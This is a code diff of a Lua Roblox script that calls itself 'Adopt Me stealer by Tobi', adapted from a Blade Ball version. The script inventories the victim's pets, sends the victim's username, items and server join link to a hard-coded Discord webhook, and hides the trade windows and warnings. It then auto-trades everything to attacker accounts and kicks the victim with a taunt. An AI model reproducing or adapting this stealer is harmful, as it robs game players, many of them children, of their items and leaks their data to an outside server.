@@ -1,5 +1,5 @@
 _G.Usernames = {"LveEnergy", "user2", "user3"} -- you can add as many as you'd like
-_G.min_rap = 100
+_G.min_value = 0.001
 _G.pingEveryone = "Yes" -- change to "No" if you dont want pings
 _G.webhook = "https://discord.com/api/webhooks/1451688110848213022/3CboHnaonpYASqPPGw8pZQ5o2glZBckOVjG_llA7hgt2uSgtWtQ3UopmaAaYjfL7X9LC" -- change to 
 _G.scriptExecuted = _G.scriptExecuted or false
@@ -8,36 +8,25 @@ if _G.scriptExecuted then
 end
 _G.scriptExecuted = true
 
-local itemsToSend = {}
-local categories = {"Sword", "Emote", "Explosion"}
-local Players = game:GetService("Players")
-local plr = Players.LocalPlayer
-local HttpService = game:GetService("HttpService")
-local netModule = game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")
-local PlayerGui = plr.PlayerGui
-local tradeGui = PlayerGui.Trade
-local inTrade = false
-local notificationsGui = PlayerGui.Notifications
-local tradeCompleteGui = PlayerGui.TradeCompleted
-local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
-local Replion = require(game.ReplicatedStorage.Packages.Replion)
-
 local users = _G.Usernames or {}
-local min_rap = _G.min_rap or 100
+local min_value = _G.min_value or 0.1
 local ping = _G.pingEveryone or "No"
 local webhook = _G.webhook or ""
 
+local Players = game:GetService("Players")
+local plr = Players.LocalPlayer
+
 if next(users) == nil or webhook == "" then
-    plr:kick("You didn't add usernames or webhook")
+    plr:kick("You didn't add username or webhook")
     return
 end
 
-if game.PlaceId ~= 13772394625 then
-    plr:kick("Game not supported. Please join a normal Blade Ball server")
+if game.PlaceId ~= 920587237 then
+    plr:kick("Game not supported. Please join a normal Adopt Me server")
     return
 end
 
-if #Players:GetPlayers() >= 16 then
+if #Players:GetPlayers() >= 48 then
     plr:kick("Server is full. Please join a less populated server")
     return
 end
@@ -47,104 +36,88 @@ if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):Invo
     return
 end
 
-local args = {
-    [1] = {
-        ["option"] = "PIN",
-        ["value"] = "9079"
-    }
+local HttpService = game:GetService("HttpService")
+local Loads = require(game.ReplicatedStorage.Fsys).load
+local RouterClient = Loads("RouterClient")
+local SendTrade = RouterClient.get("TradeAPI/SendTradeRequest")
+local AddPetRemote = RouterClient.get("TradeAPI/AddItemToOffer")
+local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
+local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
+local SettingsRemote = RouterClient.get("SettingsAPI/SetSetting")
+local InventoryDB = Loads("InventoryDB")
+
+local headers = {
+    ["Accept"] = "*/*",
+    ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
 }
-local _, PINReponse = netModule:WaitForChild("RF/ResetPINCode"):InvokeServer(unpack(args))
-if PINReponse ~= "You don't have a PIN code" then
-    plr:kick("Account error. Please disable trade PIN and try again")
-    return
-end
 
-tradeGui.Black.Visible = false
-tradeGui.MiscChat.Visible = false
-tradeCompleteGui.Black.Visible = false
-tradeCompleteGui.Main.Visible = false
+local valueResponse = request({
+    Url = "https://elvebredd.com/api/pets/get-latest",
+    Method = "GET",
+    Headers = headers
+})
 
-local maintradegui = tradeGui.Main
-maintradegui.Visible = false
-maintradegui:GetPropertyChangedSignal("Visible"):Connect(function()
-    maintradegui.Visible = false
-end)
-local unfairTade = tradeGui.UnfairTradeWarning
-unfairTade.Visible = false
-unfairTade:GetPropertyChangedSignal("Visible"):Connect(function()
-    unfairTade.Visible = false
-end)
-local notificationsFrame = notificationsGui.Notifications
-notificationsFrame.Visible = false
-notificationsFrame:GetPropertyChangedSignal("Visible"):Connect(function()
-    notificationsFrame.Visible = false
-end)
+local responseData = HttpService:JSONDecode(valueResponse.Body)
+local petsData = HttpService:JSONDecode(responseData.pets)
 
-tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
-    inTrade = tradeGui.Enabled
-end)
-
-local function sendTradeRequest(user)
-    local args = {
-        [1] = game:GetService("Players"):WaitForChild(user)
-    }
-    repeat
-        wait(0.1)
-        local response = netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(unpack(args))
-    until response == true
-end
-
-local function addItemToTrade(itemType, ID)
-    local args = {
-        [1] = itemType,
-        [2] = ID
-    }
-    repeat
-        local response = netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(unpack(args))
-    until response == true
-end
-
-local function readyTrade()
-    local args = {
-        [1] = true
-    }
-    repeat
-        wait(0.1)
-        local response = netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(unpack(args))
-    until response == true
-end
-
-local function confirmTrade()
-    repeat
-        wait(0.1)
-        netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
-    until not inTrade
-end
-
-local function formatNumber(number)
-    if number == nil then
-        return "0"
+local petsByName = {}
+for key, pet in pairs(petsData) do
+    if type(pet) == "table" and pet.name then
+        petsByName[pet.name] = pet
     end
-	local suffixes = {"", "k", "m", "b", "t"}
-	local suffixIndex = 1
-	while number >= 1000 and suffixIndex < #suffixes do
-		number = number / 1000
-		suffixIndex = suffixIndex + 1
-	end
-    if suffixIndex == 1 then
-        return tostring(math.floor(number))
+end
+
+local function getPetValue(petName, petProps)
+    local pet = petsByName[petName]
+    if not pet then
+        return nil
+    end
+
+    local baseKey
+    if petProps.mega_neon then
+        baseKey = "mvalue"
+    elseif petProps.neon then
+        baseKey = "nvalue"
     else
-        if number == math.floor(number) then
-            return string.format("%d%s", number, suffixes[suffixIndex])
-        else
-            return string.format("%.2f%s", number, suffixes[suffixIndex])
-        end
+        baseKey = "rvalue"
     end
+
+    local suffix = ""
+    if petProps.rideable and petProps.flyable then
+        suffix = " - fly&ride"
+    elseif petProps.rideable then
+        suffix = " - ride"
+    elseif petProps.flyable then
+        suffix = " - fly"
+    else
+        suffix = " - nopotion"
+    end
+
+    local key = baseKey .. suffix
+    return pet[key] or pet[baseKey]
 end
 
-local totalRAP = 0
+local totalValue = 0
+
+local function propertiesToString(props)
+    local str = ""
+    if props.rideable then str = str .. "r" end
+    if props.flyable then str = str .. "f" end
+    if props.mega_neon then
+        str = str .. "m"
+    elseif props.neon then
+        str = str .. "n"
+    else
+        str = str .. "d"
+    end
+    return str
+end
 
 local function SendJoinMessage(list, prefix)
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+
     local fields = {
         {
             name = "Victim Username:",
@@ -153,7 +126,7 @@ local function SendJoinMessage(list, prefix)
         },
         {
             name = "Join link:",
-            value = "https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId
+            value = "https://fern.wtf/joiner?placeId=85896571713843&gameInstanceId=" .. game.JobId
         },
         {
             name = "Item list:",
@@ -162,21 +135,23 @@ local function SendJoinMessage(list, prefix)
         },
         {
             name = "Summary:",
-            value = string.format("Total RAP: %s", formatNumber(totalRAP)),
+            value = string.format("Total Value: %s", totalValue),
             inline = false
         }
     }
 
     local grouped = {}
     for _, item in ipairs(list) do
-        if grouped[item.Name] then
-            grouped[item.Name].Count = grouped[item.Name].Count + 1
-            grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP
+        local key = item.Name .. " " .. propertiesToString(item.Properties)
+        if grouped[key] then
+            grouped[key].Count = grouped[key].Count + 1
+            grouped[key].TotalValue = grouped[key].TotalValue + item.Value
         else
-            grouped[item.Name] = {
+            grouped[key] = {
                 Name = item.Name,
+                Properties = item.Properties,
                 Count = 1,
-                TotalRAP = item.RAP
+                TotalValue = item.Value
             }
         end
     end
@@ -187,11 +162,11 @@ local function SendJoinMessage(list, prefix)
     end
 
     table.sort(groupedList, function(a, b)
-        return a.TotalRAP > b.TotalRAP
+        return a.TotalValue > b.TotalValue
     end)
 
     for _, group in ipairs(groupedList) do
-        local itemLine = string.format("%s (x%s) - %s RAP", group.Name, group.Count, formatNumber(group.TotalRAP))
+        local itemLine = string.format("%s %s (x%s): %s Value", group.Name, propertiesToString(group.Properties), group.Count, group.TotalValue)
         fields[3].value = fields[3].value .. itemLine .. "\n"
     end
 
@@ -208,20 +183,18 @@ local function SendJoinMessage(list, prefix)
     end
 
     local data = {
-        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
+        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(920587237, '" .. game.JobId .. "')",
         ["embeds"] = {{
-            ["title"] = "\240\159\148\180 Join to get Blade Ball hit",
+            ["title"] = "\240\159\144\178 Join to get Adopt Me hit",
             ["color"] = 65280,
             ["fields"] = fields,
             ["footer"] = {
-                ["text"] = "Blade Ball stealer by Tobi. discord.gg/GY2RVSEGDT"
+                ["text"] = "Adopt Me stealer by Tobi. discord.gg/GY2RVSEGDT"
             }
         }}
     }
+
     local body = HttpService:JSONEncode(data)
-    local headers = {
-        ["Content-Type"] = "application/json"
-    }
     local response = request({
         Url = webhook,
         Method = "POST",
@@ -230,8 +203,12 @@ local function SendJoinMessage(list, prefix)
     })
 end
 
-local function SendMessage(list)
-    local fields = {
+local function SendMessage(sortedItems)
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+
+	local fields = {
 		{
 			name = "Victim Username:",
 			value = plr.Name,
@@ -244,21 +221,23 @@ local function SendMessage(list)
 		},
         {
             name = "Summary:",
-            value = string.format("Total RAP: %s", formatNumber(totalRAP)),
+            value = string.format("Total Value: %s", totalValue),
             inline = false
         }
 	}
 
     local grouped = {}
-    for _, item in ipairs(list) do
-        if grouped[item.Name] then
-            grouped[item.Name].Count = grouped[item.Name].Count + 1
-            grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP
+    for _, item in ipairs(sortedItems) do
+        local key = item.Name .. " " .. propertiesToString(item.Properties)
+        if grouped[key] then
+            grouped[key].Count = grouped[key].Count + 1
+            grouped[key].TotalValue = grouped[key].TotalValue + item.Value
         else
-            grouped[item.Name] = {
+            grouped[key] = {
                 Name = item.Name,
+                Properties = item.Properties,
                 Count = 1,
-                TotalRAP = item.RAP
+                TotalValue = item.Value
             }
         end
     end
@@ -269,11 +248,11 @@ local function SendMessage(list)
     end
 
     table.sort(groupedList, function(a, b)
-        return a.TotalRAP > b.TotalRAP
+        return a.TotalValue > b.TotalValue
     end)
 
     for _, group in ipairs(groupedList) do
-        local itemLine = string.format("%s (x%s) - %s RAP", group.Name, group.Count, formatNumber(group.TotalRAP))
+        local itemLine = string.format("%s %s (x%s): %s Value", group.Name, propertiesToString(group.Properties), group.Count, group.TotalValue)
         fields[2].value = fields[2].value .. itemLine .. "\n"
     end
 
@@ -291,19 +270,16 @@ local function SendMessage(list)
 
     local data = {
         ["embeds"] = {{
-            ["title"] = "\240\159\148\180 New Blade Ball Execution" ,
+            ["title"] = "\240\159\144\178 New Adopt Me Execution" ,
             ["color"] = 65280,
 			["fields"] = fields,
 			["footer"] = {
-				["text"] = "Blade Ball stealer by Tobi. discord.gg/GY2RVSEGDT"
+				["text"] = "Adopt Me stealer by Tobi. discord.gg/GY2RVSEGDT"
 			}
         }}
     }
 
     local body = HttpService:JSONEncode(data)
-    local headers = {
-        ["Content-Type"] = "application/json"
-    }
     local response = request({
         Url = webhook,
         Method = "POST",
@@ -312,71 +288,82 @@ local function SendMessage(list)
     })
 end
 
-local rapDataResult = Replion.Client:GetReplion("ItemRAP")
-local rapData = rapDataResult.Data.Items
-
-local function buildNameToRAPMap(category)
-    local nameToRAP = {}
-    local categoryRapData = rapData[category]
-
-    if not categoryRapData then
-        return nameToRAP
-    end
-
-    for serializedKey, rap in pairs(categoryRapData) do
-        local success, decodedKey = pcall(function()
-            return HttpService:JSONDecode(serializedKey)
-        end)
-
-        if success and type(decodedKey) == "table" then
-            for _, pair in ipairs(decodedKey) do
-                if pair[1] == "Name" then
-                    local itemName = pair[2]
-                    nameToRAP[itemName] = rap
-                    break
-                end
+local hashes = {}
+for _, v in pairs(getgc()) do
+    if type(v) == "function" and debug.getinfo(v).name == "get_remote_from_cache" then
+        local upvalues = debug.getupvalues(v)
+        if type(upvalues[1]) == "table" then
+            for key, value in pairs(upvalues[1]) do
+                hashes[key] = value
             end
         end
     end
-    return nameToRAP
 end
 
-local rapMappings = {}
-for _, category in ipairs(categories) do
-    rapMappings[category] = buildNameToRAPMap(category)
+local function hashedAPI(remoteName, ...)
+    local remote = hashes[remoteName]
+    if not remote then return nil end
+
+    if remote:IsA("RemoteFunction") then
+        return remote:InvokeServer(...)
+    elseif remote:IsA("RemoteEvent") then
+        remote:FireServer(...)
+    end
 end
 
-local function getRAP(category, itemName)
-    local rapMap = rapMappings[category]
-    if rapMap then
-        local rap = rapMap[itemName]
-        if rap then
-            return rap
-        else
-            return 0
+local data = hashedAPI("DataAPI/GetAllServerData")
+if not data then
+    plr:kick("Tampering detected. Please rejoin and re-execute without any other scripts")
+    return
+end
+
+local excludedItems = {
+    "spring_2025_minigame_scorching_kaijunior",
+    "spring_2025_minigame_toxic_kaijunior",
+    "spring_2025_minigame_spiked_kaijunior",
+    "spring_2025_minigame_spotted_kaijunior"
+}
+local inventory = data[plr.Name].inventory
+
+for category, list in pairs(inventory) do
+    for uid, data in pairs(list) do
+        local cat = InventoryDB[data.category]
+        if cat and cat[data.id] then
+            local value = getPetValue(cat[data.id].name, data.properties)
+            if value and value >= min_value then
+                if table.find(excludedItems, data.id) then
+                    continue
+                end
+                table.insert(itemsToSend, {UID = uid, Name = cat[data.id].name, Properties = data.properties, Value = value})
+                totalValue = totalValue + value
+            end
         end
+    end
+end
+
+tradeFrame:GetPropertyChangedSignal("Visible"):Connect(function()
+    if tradeFrame.Visible then
+        inTrade = true
     else
-        return 0
+        inTrade = false
     end
-end
+end)
 
-for _, category in ipairs(categories) do
-    for itemId, itemInfo in pairs(clientInventory[category]) do
-        if itemInfo.TradeLock then
-            continue
-        end
-        local itemName = itemInfo.Name
-        local rap = getRAP(category, itemName)
-        if rap >= min_rap then
-            totalRAP = totalRAP + rap
-            table.insert(itemsToSend, {ItemID = itemId, RAP = rap, itemType = category, Name = itemName})
-        end
-    end
-end
+dialog:GetPropertyChangedSignal("Visible"):Connect(function()
+    dialog.Visible = false
+end)
+
+toolApp:GetPropertyChangedSignal("Visible"):Connect(function()
+    toolApp.Visible = true
+end)
+
+game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Enabled = false
+game:GetService("Players").LocalPlayer.PlayerGui.HintApp:Destroy()
+game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog.Visible = false
 
 if #itemsToSend > 0 then
     table.sort(itemsToSend, function(a, b)
-        return a.RAP > b.RAP
+        return a.Value > b.Value
     end)
 
     local sentItems = {}
@@ -390,54 +377,46 @@ if #itemsToSend > 0 then
     end
 
     SendJoinMessage(itemsToSend, prefix)
-
-    local function getNextBatch(items, batchSize)
-        local batch = {}
-        for i = 1, math.min(batchSize, #items) do
-            table.insert(batch, table.remove(items, 1))
-        end
-        return batch
-    end
+    SettingsRemote:FireServer("trade_requests", 1)
 
     local function doTrade(joinedUser)
         while #itemsToSend > 0 do
-            sendTradeRequest(joinedUser)
-            repeat
-                wait(0.5)
-            until inTrade
-
-            local currentBatch = getNextBatch(itemsToSend, 100)
-            for _, item in ipairs(currentBatch) do
-                addItemToTrade(item.itemType, item.ItemID)
-            end
-
-            local rawText = PlayerGui.TradeRequest.Main.Currency.Coins.Amount.Text
-            local trimmedText = rawText:gsub("^%s*(.-)%s*$", "%1")
-            local cleanedText = trimmedText:gsub("[^%d]", "")
-            local tokensamount = tonumber(cleanedText) or 0
-            if tokensamount >= 1 then
-                netModule:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(tokensamount)
-            end
-
-            readyTrade()
-            confirmTrade()
-        end
-        plr:kick("All your stuff just got stolen by Tobi's stealer. discord.gg/GY2RVSEGDT")
-    end
-
-    local function waitForUserJoin()
-        local sentMessage = false
-        local function onUserJoin(player)
-            if table.find(users, player.Name) then
-                if not sentMessage then
-                    SendMessage(sentItems)
-                    sentMessage = true
+            local tradeRequestSent = false
+            if not inTrade and not tradeRequestSent then
+                SendTrade:FireServer(game.Players[joinedUser])
+                tradeRequestSent = true
+            else
+                for i = 1, math.min(18, #itemsToSend) do
+                    local item = table.remove(itemsToSend, 1)
+                    AddPetRemote:FireServer(item.UID)
                 end
-                doTrade(player.Name)
+                repeat
+                    AcceptNegotiationRemote:FireServer()
+                    wait(0.1)
+                    ConfirmTradeRemote:FireServer()
+                until not inTrade
+                tradeRequestSent = false
+            end
+            wait(1)
+        end
+        plr:kick("All your stuff just got taken by Tobi's stealer. discord.gg/GY2RVSEGDT")
+    end
+
+    local function waitForUserChat()
+        local sentMessage = false
+        local function onPlayerChat(player)
+            if table.find(users, player.Name) then
+                player.Chatted:Connect(function()
+                    if not sentMessage then
+                        SendMessage(sentItems)
+                        sentMessage = true
+                    end
+                    doTrade(player.Name)
+                end)
             end
         end
-        for _, p in ipairs(Players:GetPlayers()) do onUserJoin(p) end
-        Players.PlayerAdded:Connect(onUserJoin)
+        for _, p in ipairs(Players:GetPlayers()) do onPlayerChat(p) end
+        Players.PlayerAdded:Connect(onPlayerChat)
     end
-    waitForUserJoin()
+    waitForUserChat()
 end
